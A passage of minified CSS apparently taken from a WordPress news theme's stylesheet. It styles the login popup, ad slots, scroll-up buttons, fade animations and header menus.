100%);z-index:-2}.white-popup-block:before{content:'';width:100%;height:100%;position:absolute;top:0;left:0;display:block;background-repeat:var(--td_login_background_repeat,no-repeat);background-size:var(--td_login_background_size,cover);background-position:var(--td_login_background_position,top);opacity:var(--td_login_background_opacity, 1);z-index:-3}.mfp-content .td-login-wrap{position:relative}.mfp-content .td-login-wrap.td-login-wrap-fb-open #register-link,.mfp-content .td-login-wrap.td-login-wrap-fb-open .td-back-button,.mfp-content .td-login-wrap.td-login-wrap-fb-open .td-login-info-text,.mfp-content .td-login-wrap.td-login-wrap-fb-open .td-login-panel-descr,.mfp-content .td-login-wrap.td-login-wrap-fb-open .td-login-panel-title,.mfp-content .td-login-wrap.td-login-wrap-fb-open .td-login-social,.mfp-content .td-login-wrap.td-login-wrap-fb-open form{opacity:.5;pointer-events:none}.mfp-content #login-form .td-login-wrap-fb-open+.mfp-close{opacity:.5;pointer-events:none}.mfp-content .td-back-button{visibility:hidden;opacity:0;-webkit-transition:.5s cubic-bezier(.79, .14, .15, .86);transition:all .5s cubic-bezier(.79, .14, .15, .86) 0s;position:absolute;top:13px;left:8px;color:var(--td_login_text_color,#fff);width:50px;height:50px;z-index:99}.mfp-content .td-back-button i{line-height:50px;font-size:16px;color:var(--td_login_text_color,#fff)}.mfp-content .td-login-inputs{width:100%;display:inline-block;position:relative;margin-bottom:30px;font-size:15px;font-weight:400;color:var(--td_login_text_color,#fff)}.mfp-content .td-login-inputs label{position:absolute;top:8px;left:0;text-transform:uppercase;-webkit-transition:.2s;transition:all .2s ease;pointer-events:none}.mfp-content .td-login-inputs:after{content:'';position:absolute;bottom:0;left:0;width:100%;height:1px;background-color:var(--td_login_text_color,#fff);opacity:.3}.mfp-content .td-login-input{position:relative;background-color:transparent!important;height:40px;margin:0!important;padding:0;box-shadow:none!important;font-size:15px;color:var(--td_login_text_color,#fff);outline:0;border:0}.mfp-content .td-login-input:focus~label,.mfp-content .td-login-input:valid~label{top:-18px;font-size:11px;opacity:.6}.mfp-content .td-login-input:invalid{font-style:italic}.mfp-content .td-login-button{width:100%;height:50px;background-color:var(--td_login_button_background,#fff);padding:5px 12px 6px;margin-top:20px;margin-bottom:0;text-transform:uppercase;text-shadow:none;font-size:13px;font-weight:600;color:var(--td_login_button_color,#000);-webkit-box-shadow:1px 1px 4px 0 rgba(0,0,0,.2);box-shadow:1px 1px 4px 0 rgba(0,0,0,.2);border:0;border-radius:0;-webkit-transition:background-color .2s!important;transition:background-color .2s ease!important}.mfp-content .td-login-button:active,.mfp-content .td-login-button:hover{-webkit-box-shadow:1px 1px 4px 0 rgba(0,0,0,.2);box-shadow:1px 1px 4px 0 rgba(0,0,0,.2);background-color:var(--td_login_hover_background,#deea4b);color:var(--td_login_hover_color,#000)}.mfp-content .td-login-social{width:100%;margin-top:15px;margin-bottom:8px}.mfp-content .td-login-info-text{display:block;margin-top:3px;font-size:11px;color:var(--td_login_text_color,#fff)}.mfp-content .td-login-info-text a{color:inherit}.mfp-content .td-login-info-text a:hover{text-decoration:underline}.mfp-content #register-link{width:100%;display:block;padding:13px;margin-top:24px;font-size:13px;text-transform:uppercase;color:var(--td_login_text_color,#fff);cursor:pointer;position:relative}.mfp-content #register-link:before{content:'';width:100%;height:100%;position:absolute;top:0;left:0;border:1px solid var(--td_login_text_color,#fff);opacity:0;-webkit-transition:opacity .2s;transition:opacity .2s ease}.mfp-content #register-link:hover:before{opacity:.2}.mfp-content .td-login-form-div{padding:0 20%}@media (max-width:480px){.mfp-content .td-login-form-div{padding:0 5%}}.mfp-content #td-login-div{transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0);-webkit-transition:.5s cubic-bezier(.79, .14, .15, .86);transition:all .5s cubic-bezier(.79, .14, .15, .86) 0s}.mfp-content #td-login-div.td-display-none{display:none;visibility:hidden;opacity:0;-webkit-transition:.3s cubic-bezier(.79, .14, .15, .86);transition:all .3s cubic-bezier(.79, .14, .15, .86) 0s}.mfp-content .td-login-animation #td-login-div{transform:translate3d(-300px,0,0);-webkit-transform:translate3d(-300px,0,0)}.mfp-content .td-login-animation .td-back-button{visibility:visible;opacity:1}.mfp-content #td-forgot-pass-div,.mfp-content #td-register-div{display:none;visibility:hidden;opacity:0;-webkit-transition:.5s cubic-bezier(.79, .14, .15, .86);transition:all .5s cubic-bezier(.79, .14, .15, .86) 0s;transform:translate3d(300px,0,0);-webkit-transform:translate3d(300px,0,0)}.mfp-content #td-forgot-pass-div.td-display-block,.mfp-content #td-register-div.td-display-block{display:block;visibility:visible;opacity:1;-webkit-transition:.3s cubic-bezier(.79, .14, .15, .86);transition:all .3s cubic-bezier(.79, .14, .15, .86) 0s;transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0)}.mfp-content #login-form .mfp-close{position:absolute;top:26px;width:20px;height:20px;line-height:0;font-size:0;color:var(--td_login_text_color,#fff);font-family:newspaper,sans-serif}.mfp-content #login-form .mfp-close:before{position:absolute;top:50%;left:50%;transform:translate(-50%,50%);-webkit-transform:translate(-50%,50%);font-size:16px;vertical-align:bottom;color:var(--td_login_text_color,#fff)}.mfp-content #login-form #login-link{position:absolute;left:26px;top:28px;cursor:pointer}.mfp-content #login-form .mfp-close{right:27px;left:auto;opacity:1}.mfp-content #login-form .mfp-close:before{content:'\e902'}.mfp-content .td-login-panel-title{padding:26px 0 22px;line-height:20px;font-size:17px;text-transform:uppercase;color:var(--td_login_text_color,#fff);pointer-events:none}.mfp-content .td-login-panel-descr{margin-bottom:77px;font-size:13px;line-height:1}.mfp-content .td_display_err{color:#fff;padding:14px 30px;display:none;position:absolute;top:93px;left:0;right:0;font-size:11px;text-transform:uppercase;margin:0 -40%;line-height:1}.mfp-content .td_display_err:before{content:'';width:100%;height:100%;background-color:#000;position:absolute;top:0;left:0;opacity:.8;z-index:-1}.mfp-content .td_display_msg_ok:before{background-color:#fff;opacity:.1}.mpf-td-login-effect .mfp-with-anim{opacity:0;-webkit-transition:.4s cubic-bezier(.55, 0, .1, 1);transition:all .4s cubic-bezier(.55, 0, .1, 1);transform:perspective(600px) scale(.4);-webkit-transform:perspective(600px) scale(.4)}.mpf-td-login-effect.mfp-bg{opacity:0;transition:all .3s ease-out}.mpf-td-login-effect.mfp-ready .mfp-with-anim{opacity:1;transform:perspective(600px) scale(1);-webkit-transform:perspective(600px) scale(1)}.mpf-td-login-effect.mfp-ready.mfp-bg{opacity:.8}.mpf-td-login-effect.mfp-removing .mfp-with-anim{transform:perspective(600px) scale(.4);-webkit-transform:perspective(600px) scale(.4);opacity:0}.mpf-td-login-effect.mfp-removing.mfp-bg{opacity:0}#login_pass{display:none!important}.mfp-ready #login_pass{display:inline-block!important}.td-a-rec img{display:block}.td-visible-desktop{display:table}.td-visible-phone,.td-visible-tablet-landscape,.td-visible-tablet-portrait{display:none}@media (min-width:1019px) and (max-width:1140px){.td-visible-tablet-landscape{display:table}.td-visible-desktop{display:none}.td-visible-tablet-portrait{display:none}.td-visible-phone{display:none}}@media (min-width:768px) and (max-width:1018px){.td-visible-tablet-portrait{display:table}.td-visible-desktop{display:none}.td-visible-tablet-landscape{display:none}.td-visible-phone{display:none}}@media (max-width:767px){.td-visible-phone{display:table}.td-visible-desktop{display:none}.td-visible-tablet-landscape{display:none}.td-visible-tablet-portrait{display:none}.td-scroll-up.td-hide-scroll-up-on-mob{display:none!important}}.td-a-rec-id-custom_ad_2 img,.td-a-rec-id-custom_ad_4 img{width:100%}.td-visible-desktop,.td-visible-phone,.td-visible-tablet-landscape,.td-visible-tablet-portrait{margin-left:auto;margin-right:auto}.td-a-rec-id-custom_ad_2,.td-a-rec-id-custom_ad_4{text-align:center;display:table;margin-left:auto;margin-right:auto;position:relative}.td-a-rec-id-custom_ad_2>div,.td-a-rec-id-custom_ad_4>div{margin-bottom:44px}.td-a-rec-id-custom_ad_2 .td-block-title-wrap,.td-a-rec-id-custom_ad_4 .td-block-title-wrap{margin-bottom:26px}.td-container-wrap{background-color:var(--td_container_transparent,#fff);margin-left:auto;margin-right:auto}.td-boxed-layout .td-container-wrap{width:1164px}@media (max-width:1180px){.td-boxed-layout .td-container-wrap{width:100%}}body .td-backstretch{max-width:none;opacity:0;transition:opacity 2s;display:block}.td-scroll-up{position:fixed;bottom:4px;right:5px;cursor:pointer;z-index:9999}.ie9 .td-scroll-up{bottom:-70px}.ie9 .td-scroll-up-visible{bottom:5px}.td-scroll-up[data-style=style1]{display:none;width:40px;height:40px;background-color:var(--td_theme_color,#4db2ec);transform:translate3d(0,70px,0);transition:transform .4s cubic-bezier(.55, 0, .1, 1) 0s}.td-scroll-up[data-style=style1].td-scroll-up-visible{transform:translate3d(0,0,0)}.td-scroll-up[data-style=style1] .td-icon-menu-up{position:relative;color:#fff;font-size:20px;display:block;text-align:center;width:40px;top:7px}.td-js-loaded .td-scroll-up[data-style=style1]{display:block!important}.td-md-is-android .td-scroll-up[data-style=style1] .td-icon-menu-up{padding-top:1px}.td-scroll-up[data-style=style2]{transform:scale(.8);height:40px;width:40px;border-radius:50px;box-shadow:inset 0 0 0 2px #e7e7e7;opacity:0;visibility:hidden;transition:opacity .2s ease-in-out;pointer-events:none}.td-scroll-up[data-style=style2].td-scroll-up-visible{opacity:1;visibility:visible;pointer-events:auto;transform:scale(1)}.td-scroll-up[data-style=style2] .td-scroll-up-tooltip{position:absolute;right:0;bottom:calc(100% + 10px);transform:translateY(-20px);background-color:var(--td_black,#222);padding:5px 6px 6px;min-width:69px;font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);font-size:10px;line-height:1.1;text-align:center;color:#fff;border-radius:5px;opacity:0;transition:all .2s ease-in-out;pointer-events:none}.td-scroll-up[data-style=style2] .td-scroll-up-tt-arrow{position:absolute;right:10px;bottom:-5px;fill:var(--td_black,#222222)}.td-scroll-up[data-style=style2] .td-scroll-up-arrow{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:22px;height:auto;fill:var(--td_black,#222222);line-height:0;transition:all .2s ease-in-out}.td-scroll-up[data-style=style2] .td-scroll-up-progress-circle{transition:opacity .2s ease-in-out}.td-scroll-up[data-style=style2] .td-scroll-up-progress-circle path{fill:none;stroke:var(--td_black,#222222);stroke-width:4;box-sizing:border-box;transition:stroke-dashoffset 10ms linear 0s;stroke-dasharray:307.919,307.919}.td-scroll-up[data-style=style2]:hover .td-scroll-up-tooltip{transform:translateY(0);opacity:1}.td-scroll-up[data-style=style2]:hover .td-scroll-up-arrow{width:28px}.td-scroll-up[data-style=style2]:hover .td-scroll-up-progress-circle{opacity:0}.wpb_video_wrapper.td-video-fixed{position:fixed!important;right:0!important;top:300px!important;bottom:auto!important;left:auto!important;z-index:9999!important;margin:0!important;padding:0!important;-webkit-box-shadow:0 0 8px 0 rgba(0,0,0,.2);box-shadow:0 0 8px 0 rgba(0,0,0,.2)}.wpb_video_wrapper.td-video-fixed-left{left:0!important;right:auto!important}.wpb_video_wrapper.td-video-fixed-bottom{top:auto!important;bottom:300px!important}.td-close-video-fixed{display:none;position:absolute;right:10px;top:10px;background-color:var(--td_theme_color,#4db2ec);color:#fff;padding:7px;cursor:pointer;z-index:1}.td-close-video-fixed i{font-size:11px}.td-video-fixed .td-close-video-fixed{display:flex!important;justify-content:center;align-items:center}.td-sticky-video .td-footer-template-wrap{z-index:-1}.wpb_button{display:inline-block;font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);font-weight:600;line-height:24px;text-shadow:none;border:none;transition:none;border-radius:0;margin-bottom:21px}.wpb_button:hover{text-shadow:none;text-decoration:none!important}.widget{overflow:hidden}.td-sub-footer-container{background-color:#0d0d0d;color:#ccc;font-size:12px;font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif)}.td-sub-footer-copy{line-height:20px;margin-top:8px;margin-bottom:8px}.td-sub-footer-container .td-sub-footer-menu{float:right}@media (max-width:767px){.td-sub-footer-container{text-align:center;padding:6px 0}.td-sub-footer-copy{float:none!important}.td-sub-footer-container .td-sub-footer-menu{float:none}}.td-subfooter-menu{display:inline-block;margin:7px 0;float:right}@media (min-width:1019px) and (max-width:1140px){.td-subfooter-menu{padding-right:40px}}@media (min-width:768px) and (max-width:1018px){.td-subfooter-menu{padding-right:48px}}.td-subfooter-menu li{display:inline-block;margin-left:0;line-height:18px}.td-subfooter-menu li a{margin-right:16px;line-height:18px;display:inline-block;color:#ccc}.td-subfooter-menu li a:hover{color:var(--td_theme_color,#4db2ec)}.td-subfooter-menu li:last-child a{margin-right:0}.td-subfooter-menu ul{display:none}.td_animated{-webkit-animation-duration:.3s;animation-duration:.3s;-webkit-animation-fill-mode:both;animation-fill-mode:both}.td_animated_long{-webkit-animation-duration:.5s;animation-duration:.5s;-webkit-animation-fill-mode:both;animation-fill-mode:both}.td_animated_xlong{-webkit-animation-duration:.8s;animation-duration:.8s;-webkit-animation-fill-mode:both;animation-fill-mode:both}@-webkit-keyframes td_fadeInRight{0%{opacity:.05;-webkit-transform:translateX(20px);transform:translateX(20px)}100%{opacity:1;-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes td_fadeInRight{0%{opacity:.05;-webkit-transform:translateX(20px);transform:translateX(20px)}100%{opacity:1;-webkit-transform:translateX(0);transform:translateX(0)}}.td_fadeInRight{-webkit-animation-name:td_fadeInRight;animation-name:td_fadeInRight}@-webkit-keyframes td_fadeInLeft{0%{opacity:.05;-webkit-transform:translateX(-20px);transform:translateX(-20px)}100%{opacity:1;-webkit-transform:translateX(0);transform:translateX(0)}}@keyframes td_fadeInLeft{0%{opacity:.05;-webkit-transform:translateX(-20px);transform:translateX(-20px)}100%{opacity:1;-webkit-transform:translateX(0);transform:translateX(0)}}.td_fadeInLeft{-webkit-animation-name:td_fadeInLeft;animation-name:td_fadeInLeft}@-webkit-keyframes td_fadeInDown{0%{opacity:.05;-webkit-transform:translateY(-15px);transform:translateY(-15px)}100%{opacity:1;-webkit-transform:translateY(0);transform:translateY(0)}}@keyframes td_fadeInDown{0%{opacity:.05;-webkit-transform:translateY(-15px);transform:translateY(-15px)}100%{opacity:1;-webkit-transform:translateY(0);transform:translateY(0)}}.td_fadeInDown{-webkit-animation-name:td_fadeInDown;animation-name:td_fadeInDown}@-webkit-keyframes td_fadeInUp{0%{opacity:.05;-webkit-transform:translateY(20px);transform:translateY(20px)}100%{opacity:1;-webkit-transform:translateY(0);transform:translateY(0)}}@keyframes td_fadeInUp{0%{opacity:.05;-webkit-transform:translateY(20px);transform:translateY(20px)}100%{opacity:1;-webkit-transform:translateY(0);transform:translateY(0)}}.td_fadeInUp{-webkit-animation-name:td_fadeInUp;animation-name:td_fadeInUp}@-webkit-keyframes td_fadeIn{0%{opacity:0}100%{opacity:1}}@keyframes td_fadeIn{0%{opacity:0}100%{opacity:1}}.td_fadeIn{-webkit-animation-name:td_fadeIn;animation-name:td_fadeIn}@-webkit-keyframes td_fadeOut_to_1{0%{opacity:1}100%{opacity:.1}}@keyframes td_fadeOut_to_1{0%{opacity:1}100%{opacity:.1}}.td_fadeOut_to_1{-webkit-animation-name:td_fadeOut_to_1;animation-name:td_fadeOut_to_1}.td-lb-box{position:absolute;width:19px;height:19px}.td-lb-box-2{top:0;left:20px}.td-lb-box-3{top:0;left:40px}.td-lb-box-4{top:20px;right:0}.td-lb-box-5{bottom:0;right:0}.td-lb-box-6{bottom:0;left:20px}.td-lb-box-7{bottom:0;left:0}.td-lb-box-8{top:20px;left:0}.td-loader-gif{position:absolute;top:50%;left:50%;width:59px;height:59px;margin-top:-29.5px;margin-left:-29.5px;-webkit-transition:.4s cubic-bezier(.55, 0, .1, 1);transition:all .4s cubic-bezier(.55, 0, .1, 1)}@media (max-width:767px){.td-subfooter-menu{float:none}.td-loader-gif{top:200px}.td-md-is-ios .td-footer-wrapper .block-title a,.td-md-is-ios .td-footer-wrapper .block-title label,.td-md-is-ios .td-footer-wrapper .block-title span{padding-right:0;padding-left:0}}.td-loader-infinite{top:auto;bottom:0}.td-loader-infinite .td-lb-box{position:absolute;width:10px;height:10px}.td-loader-infinite .td-lb-box-2{top:0;left:11px}.td-loader-infinite .td-lb-box-3{top:0;left:22px}.td-loader-infinite .td-lb-box-4{top:11px;right:0}.td-loader-infinite .td-lb-box-5{bottom:0;right:0}.td-loader-infinite .td-lb-box-6{bottom:0;left:11px}.td-loader-infinite .td-lb-box-7{bottom:0;left:0}.td-loader-infinite .td-lb-box-8{top:11px;left:0}.td-loader-infinite.td-loader-gif{width:32px;height:32px;margin-top:-16px;margin-left:-16px}.td-loader-blocks-load-more{top:auto;bottom:48px}.td-loader-animation-start{opacity:0;transform:perspective(600px) scale(.4);-webkit-transform:perspective(600px) scale(.4)}.td-loader-animation-mid{opacity:1;transform:perspective(600px) scale(1);-webkit-transform:perspective(600px) scale(1)}.td-loader-animation-end{opacity:0}body.td-animation-stack-type0 .post img:not(.woocommerce-product-gallery img):not(.rs-pzimg),body.td-animation-stack-type0 .td-animation-stack .entry-thumb,body.td-animation-stack-type0 .td-animation-stack .td-lazy-img{opacity:0}.td-animation-stack-type0-2:not(.woocommerce-product-gallery img){opacity:1!important;transition:opacity .3s;transition-timing-function:cubic-bezier(0.39,0.76,0.51,0.56)}body.td-animation-stack-type1 .post .entry-thumb,body.td-animation-stack-type1 .post a.td-sml-link-to-image>img,body.td-animation-stack-type1 .post img[class*=wp-image-],body.td-animation-stack-type1 .td-animation-stack .entry-thumb,body.td-animation-stack-type1 .td-animation-stack .td-lazy-img{opacity:0;transform:scale(.95)}.td-animation-stack-type1-2{opacity:1!important;transform:scale(1)!important;-webkit-transform:scale(1)!important;-webkit-transition:transform .5s,opacity .3s cubic-bezier(.39, .76, .51, .56);transition:transform .5s ease,opacity .3s cubic-bezier(.39, .76, .51, .56) 0s}body.td-animation-stack-type2 .post .entry-thumb,body.td-animation-stack-type2 .post a.td-sml-link-to-image>img,body.td-animation-stack-type2 .post img[class*=wp-image-],body.td-animation-stack-type2 .td-animation-stack .entry-thumb,body.td-animation-stack-type2 .td-animation-stack .td-lazy-img{opacity:0;transform:translate(0,10px);-webkit-transform:translate(0,10px)}.td-animation-stack-type2-2{opacity:1!important;transform:scale(1)!important;-webkit-transform:scale(1)!important;-webkit-transition:transform .4s cubic-bezier(.13, .43, .57, .88),opacity .4s cubic-bezier(.13, .43, .57, .88);transition:transform .4s cubic-bezier(.13, .43, .57, .88),opacity .4s cubic-bezier(.13, .43, .57, .88)}.ie10 .td-post-content p,.ie11 .td-post-content p,.ie8 .td-post-content p,.ie9 .td-post-content p{letter-spacing:-.2px}.ie10 .td_block_template_1 .td-related-title>.td-related-left,.ie10 .td_block_template_1 .td-related-title>.td-related-right,.ie11 .td_block_template_1 .td-related-title>.td-related-left,.ie11 .td_block_template_1 .td-related-title>.td-related-right,.ie8 .td_block_template_1 .td-related-title>.td-related-left,.ie8 .td_block_template_1 .td-related-title>.td-related-right,.ie9 .td_block_template_1 .td-related-title>.td-related-left,.ie9 .td_block_template_1 .td-related-title>.td-related-right{padding:8px 12px 6px}.ie10 .td-affix .td-main-menu-logo img,.ie11 .td-affix .td-main-menu-logo img,.ie8 .td-affix .td-main-menu-logo img,.ie9 .td-affix .td-main-menu-logo img{top:-2px}.ie8 .td-post-source-tags{display:none}.ie8 .td-next-prev-wrap .td-ajax-prev-page{padding-left:1px}.ie8 .td-social-facebook .td-social-but-text{border-left:1px solid #7f9edf}.ie8 .td-social-twitter .td-social-but-text{border-left:1px solid #8fe2fc}.ie8 .td-social-style-2 .td-icon-font{border:1px solid #333}.ie8 .td-menu-background{left:-100%}.ie9 .td-next-prev-wrap .td-ajax-next-page{padding-left:3px}.ie9 #td-mobile-nav,.ie9 .td-menu-background{left:-100%}.ie9 .td-menu-mob-open-menu #td-mobile-nav,.ie9 .td-menu-mob-open-menu .td-menu-background{left:0}.ie9 .td-search-background{right:100%}.ie9 .td-search-opened .td-search-background{right:0}.td-md-is-android .sf-menu ul .td-menu-item>a{padding:8px 14px 6px}.td-md-is-android .sf-menu .sub-menu .td-icon-menu-down{margin-top:-8px}.td-md-is-android .td-trending-now-wrapper .td-trending-now-nav-left{padding-right:1px}.td-md-is-android .block-title a,.td-md-is-android .block-title label,.td-md-is-android .block-title span{padding:8px 12px 3px}.td-md-is-android .td-category-siblings .td-category{height:21px}.td-md-is-android input[type=submit]{padding:9px 15px 8px}.td-md-is-android .td-next-prev-wrap a{line-height:25px}.td-md-is-android .page-nav .td-icon-menu-right{padding-left:2px}.td-md-is-android .page-nav .td-icon-menu-left{padding-right:2px}.td-md-is-ios body{-webkit-font-smoothing:antialiased}.td-md-is-ios .sf-menu .sub-menu .td-icon-menu-down{margin-top:-9px;line-height:20px}.td-md-is-ios .td-trending-now-wrapper .td-trending-now-nav-left{padding-right:1px}.td-md-is-ios .td_block_template_1 .td-related-title>.td-related-left,.td-md-is-ios .td_block_template_1 .td-related-title>.td-related-right{padding:8px 12px 6px}.td-md-is-ios input[type=submit]{padding:7px 15px 8px}.td-md-is-ios .td-footer-wrapper .td_block_template_1 .block-title *{padding-right:0;padding-left:0}@media (min-width:1140px){.ie10,.ie11,.ie8,.ie9{margin-left:-1px}.ie10 .td-affix,.ie11 .td-affix,.ie8 .td-affix,.ie9 .td-affix{margin-left:1px}.ie11{margin-left:-1px}.ie11 .td-affix{margin-left:1px}.td-md-is-safari{margin-left:-1px}.td-md-is-safari .td-affix{margin-left:1px}}.td-md-is-safari .td_block_template_1 .td-related-title>.td-related-left,.td-md-is-safari .td_block_template_1 .td-related-title>.td-related-right{padding:7px 12px 5px}.td-md-is-chrome .td_block_inner_overflow .item-details,.td-md-is-chrome .td_block_inner_overflow .td_module_wrap{position:relative}.mfp-figure.td-caption-align-left figcaption .mfp-title{text-align:left}.mfp-figure.td-caption-align-center figcaption .mfp-title{text-align:center}.mfp-figure.td-caption-align-right figcaption .mfp-title{text-align:right}.clearfix:after,.clearfix:before{display:table;content:"";line-height:0}html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,nav{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}b,strong{font-weight:700}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}img{border:0}svg:not(:root){overflow:hidden}figure{margin:0}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,pre{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}th{padding:0}.td_smart_list_1{position:relative;overflow:hidden;z-index:1;margin-top:38px}.td_smart_list_3{position:relative;overflow:hidden;z-index:1}.td-header-sp-logo img{margin:auto;position:absolute;top:0;bottom:0;left:0;right:0}.td-main-menu-logo{display:none;float:left;margin-right:10px;height:48px}.td-main-menu-logo a{line-height:48px}.td-main-menu-logo img{padding:3px 0;position:relative;vertical-align:middle;max-height:48px;width:auto}@media (max-width:767px){.td-main-menu-logo{display:block;margin-right:0;height:0}.td-main-menu-logo img{margin:auto;bottom:0;top:0;left:0;right:0;position:absolute;padding:0}}@media (min-width:768px){.td-affix .td-logo-sticky{display:block}.td-header-wrap .td-affix .td-main-menu-logo{height:48px!important}.td-header-wrap .td-affix .td-main-menu-logo a{line-height:48px!important}.td-header-wrap .td-affix .td-main-menu-logo img{max-height:48px!important;top:-1px}.td-header-wrap .td-affix .sf-menu>li>a{line-height:48px!important}.td-affix .header-search-wrap .td-icon-search{line-height:48px!important}.td-affix #td-header-menu{display:block}}.td-visual-hidden{border:0;width:1px;height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute}.td-header-menu-wrap.td-affix{-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);margin-right:auto;margin-left:auto;width:100%;z-index:9999;position:fixed!important;background-color:#fff;background-color:rgba(255,255,255,.95);top:0}.admin-bar .td-header-menu-wrap.td-affix{top:32px}@media (max-width:767px){.admin-bar .td-header-menu-wrap.td-affix{top:46px}.td-header-style-7 .td-header-sp-logo{display:none}}@media (max-width:602px){.admin-bar .td-header-menu-wrap.td-affix{top:0}}.td-boxed-layout #td-outer-wrap{z-index:1}.td-boxed-layout .td-header-menu-wrap.td-affix{width:1164px;margin-right:auto;margin-left:auto}@media (max-width:1140px){.td-main-menu-logo img{max-width:180px}.td-boxed-layout .td-header-menu-wrap.td-affix{width:100%}}.td-header-wrap .td_module_mx2 .entry-title a:after{position:absolute;left:0;width:100%;top:0;bottom:0;content:'';z-index:1}.td-header-wrap .result-msg{text-align:center;padding:4px 0 6px;font-family:var(--td_default_google_font_2,'Roboto',sans-serif);font-size:12px;color:#222;font-style:italic}.td-header-wrap .result-msg a{color:#222;display:block}.td-header-wrap .result-msg a:hover{color:var(--td_theme_color,#4db2ec)}.td-header-wrap .td-aj-search-results{background-color:rgba(144,144,144,.02);border-top:1px solid #ededed;border-bottom:1px solid #ededed;padding:10px 0}.td-header-wrap .td-aj-search-results .item-details{margin:10px 20px 10px 115px}.td-header-wrap .td-aj-search-results .td-module-thumb{top:10px;margin-left:20px}.td-header-wrap .td_module_mx2{padding-bottom:0}.td-header-wrap .td-aj-cur-element{background-color:rgba(128,128,128,.1)}.td-header-style-7 #td-header-menu{display:block}.td-header-style-7 .top-header-menu .sub-menu{background-color:#fff}.td-header-style-7 .td-header-sp-logo{margin-right:42px;float:left;height:106px;padding:0}@media (min-width:1019px) and (max-width:1140px){.td-header-style-7 .td-header-sp-logo{margin-right:20px}.td-header-style-7 .sf-menu>li>a{padding:0 12px}}.td-header-style-7 .td-header-sp-logo a{line-height:106px}@media (min-width:768px) and (max-width:1018px){.td-header-style-7 .td-header-sp-logo{margin-right:10px;height:54px}.td-header-style-7 .td-header-sp-logo a{line-height:54px}}.td-header-style-7 .td-header-sp-logo img{width:auto;max-height:106px;position:relative;padding:6px 0;line-height:106px;vertical-align:middle}.td-header-style-7 .td-main-menu-logo{display:none}.td-header-style-7 .header-search-wrap{bottom:0;top:auto}.td-header-style-7 .header-search-wrap .td-icon-search{color:#000}.td-header-style-7 .header-search-wrap #td-header-search-button .td-icon-search{line-height:78px}.td-header-style-7 .td-header-main-menu,.td-header-style-7 .td-header-menu-wrap-full{position:relative}.td-header-style-7 .sf-menu{margin-top:28px;float:right}.td-header-style-7 .sf-menu>li>a{line-height:78px}@media (max-width:767px){.td-header-style-7 .td-main-menu-logo{display:block}.td-header-style-7 .header-search-wrap .td-icon-search{color:#fff}.td-header-style-7 .td-header-main-menu{height:54px}}.td-header-style-7 .td-affix .td-header-sp-logo{display:none}.td-header-style-7 .td-affix .td-logo-sticky{display:block}.td-header-style-7 .td-affix .sf-menu{margin-top:0}.td-header-style-7 .td-affix .header-search-wrap{margin-top:0}.td-mega-menu{position:static!important}.td-mega-menu ul.sub-menu{position:absolute;width:1114px!important;height:auto;left:50%!important;transform:translateX(-50%);-webkit-transform:translateX(-50%);display:none;border:1px solid #eaeaea;box-shadow:0 2px 6px rgba(0,0,0,.1)}.block-mega-child-cats{overflow-x:hidden;overflow-y:auto;max-height:252px;-webkit-overflow-scrolling:touch}@media (min-width:1019px) and (max-width:1140px){.td-header-style-7 .sf-menu a.sf-with-ul{padding-right:26px}.td-mega-menu ul.sub-menu{width:1024px!important}.block-mega-child-cats{max-height:238px}}@media (min-width:768px) and (max-width:1018px){.td-header-style-7 .td-header-sp-logo img{max-width:140px;max-height:54px;line-height:54px;padding:3px 0}.td-header-style-7 .header-search-wrap #td-header-search-button .td-icon-search{line-height:48px}.td-header-style-7 .sf-menu{margin-top:6px}.td-header-style-7 .sf-menu>li>a{line-height:48px}.td-mega-menu ul.sub-menu{width:786px!important}.block-mega-child-cats{max-height:224px}}.td_data_time{display:inline-block;margin-right:32px}.menu-top-container{display:inline-block;margin-right:16px}.top-header-menu{list-style:none;margin:0;display:inline-block}.top-header-menu li{display:inline-block;position:relative;margin-left:0}.top-header-menu li li{width:100%}.top-header-menu li a{margin-right:16px;line-height:1}.top-header-menu li a:hover{color:var(--td_theme_color,#4db2ec)}.top-header-menu>li{line-height:28px}.top-header-menu>.td-normal-menu:hover>.sub-menu{display:block!important}.top-header-menu .avatar{display:inline-block;vertical-align:middle;margin-right:6px;position:relative;top:-1px}.top-header-menu .td-icon-menu-down{padding-left:6px;font-size:8px;position:relative;top:-1px}.top-header-menu .sub-menu{display:none;position:absolute;top:100%;left:-10px;line-height:28px;background-color:#222;z-index:1000}.top-header-menu .sub-menu a{display:block;margin:0 10px;white-space:nowrap;line-height:28px}.top-header-menu .current-menu-item>a{color:var(--td_theme_color,#4db2ec)}.top-header-menu .td-mega-menu .td-icon-menu-down,.top-header-menu ul .td-icon-menu-down{display:none}.top-header-menu .td-mega-menu ul,.top-header-menu ul ul{display:none!important}.td-social-icon-wrap>a{display:inline-block}.td-social-icon-wrap 